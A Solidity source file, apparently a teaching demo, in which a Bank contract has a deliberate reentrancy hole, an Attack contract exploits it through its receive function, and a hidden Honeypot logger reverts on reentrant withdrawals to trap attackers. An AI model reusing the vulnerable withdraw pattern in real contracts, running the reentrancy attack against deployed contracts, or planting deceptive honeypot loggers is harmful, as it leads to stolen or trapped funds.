//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILogger {
    event Log(address caller, uint amount, uint actionCode);

    function log(address _caller, uint _amount, uint _actionCode) external;
}

contract Logger is ILogger {
    function log(address _caller, uint _amount, uint _actionCode) public {
        emit Log(_caller, _amount, _actionCode);
    }
}

contract Honeypot is ILogger {
    function log(address, uint, uint _actionCode) public pure {
        if(_actionCode == 2) {
            revert("honeypot!");
        }
    }
}

contract Bank {
    mapping(address => uint) public balances;
    ILogger public logger;
    bool resuming;

    constructor(ILogger _logger) {
        logger = _logger;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);

        balances[msg.sender] += msg.value;

        logger.log(msg.sender, msg.value, 0);
    }

    function withdraw() public {
        if(resuming == true) {
            _withdraw(msg.sender, 2);
        } else {
            resuming = true;
            _withdraw(msg.sender, 1);
        }
    }

    function _withdraw(address _initiator, uint _statusCode) internal {
        (bool success, ) = msg.sender.call{value: balances[_initiator]}("");
        
        require(success, "Failed to send Ether");

        balances[_initiator] = 0;

        logger.log(msg.sender, msg.value, _statusCode);

        resuming = false;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    uint constant PAY_AMOUNT = 1 ether;

    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    function attack() public payable {
        require(msg.value == PAY_AMOUNT);
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        if(bank.getBalance() >= PAY_AMOUNT) {
            bank.withdraw();
        }
    }
}